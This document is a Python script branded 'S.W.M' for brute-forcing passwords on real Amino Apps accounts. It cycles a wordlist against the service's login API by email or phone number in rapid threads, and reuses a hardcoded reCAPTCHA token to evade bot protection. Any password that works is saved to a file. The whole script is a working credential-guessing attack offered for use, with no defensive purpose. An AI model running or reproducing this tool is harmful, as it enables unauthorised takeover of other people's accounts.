import requests
import pyfiglet
import threading
import time


out = pyfiglet.figlet_format("S.W.M", font="slant")

word_list = open('words.txt','r')
words_collection = word_list.readlines()

recaptcha_version = 'v3'
recaptcha_challenge = "03AOLTBLTAc9t-dPiTwwy6Oq2PvB0jIa-HAQjbo3Q6Grjm89PyR7SLSuDupcW1GME8mcz5KNxjhHBnrfO_dwp6F7lmNGueYECdNfWm3i0KP9EIwCqsFalQw_SOUdlZ47WTQxc35r-ufNsMijK6Kxt8AyMElk9VKM-DMWcr6Q6nwc2vACeumYh7QaC80CpTDcCcQngc8fd5ORWgJJiz_GNVYDKU2fEODHNKRhF6-enRfKPOgakANIuouV2zM3iT3rhvTe_cYRs1sfb_PPByZrWKE4p7_NNsOp4SbfqOZ8XhRigBWE3D3UZ2YMpVBaiSY0SJkiVop2hK65kWXjv2-jHVkMWUsmVYSP9dtCkpaMWAZPLD-o27XWb8TfG3mq2bHccimA4v_KkObv0DqTr9xrmjacXScybsKQms2bIne9j5GFYQw5y7l_gHLXbNcIAAAVZNU-NKttDglIVyKt0vKOTltwn73S-y8HM4fGKryaiX9jzvOBa5v57N3xXwwEWLouPyw50V1y_oGUm6"


def start():
	print(out)
	print("----------------t.me/post11x----------------")
	auth_type = int(input('1-Брут по почте\n2-Брут по номеру телефона.\n\n[S.W.M] -- > '))
	if auth_type == 1 or auth_type ==2:
		start_brute(auth_type)
	else:
		print('[S.W.M] -- > Данного параметра не существует.')


def brute_email(password, email, authType):
	jsonData = {'recaptcha_challenge':recaptcha_challenge,'recaptcha_version':recaptcha_version,'auth_type':0,'secret':password,authType:email}
	while True:
		r = requests.post('https://aminoapps.com/api/auth', json=jsonData, timeout=2.5)
		break

	if 'nickname' in r.json()['result'] or 'title' in r.json()['result']:
		passwordFound = open('password_result.txt','w+')
		passwordFound.write(f'{email}:{password}\n')
		passwordFound.close()
		print(f'[S.W.M] -- > Пароль найден!\n\n[S.W.M] -- > Пароль: {str(password)}')
		exit()
	else:
		print(f'[S.W.M] -- > Пароль не равен: {str(password)}')
		return False


def start_brute(auth_type):
	email = input('[S.W.M] -- > Введите почту/телефон: ')
	for word in words_collection:
		print(f'[S.W.M] -- > Пробую этот пароль: ' + str(word).replace('\n',''))
		word = str(word).replace('\n','')
		if auth_type == 1:
			auth_types = 'email'
		else:
			auth_types = 'phoneNumber'
		x = threading.Thread(target=brute_email,args=(word, email, auth_types))
		x.start()
		time.sleep(0.075)
		
	time.sleep(10)
	x.join()


if __name__ == "__main__":
	start()
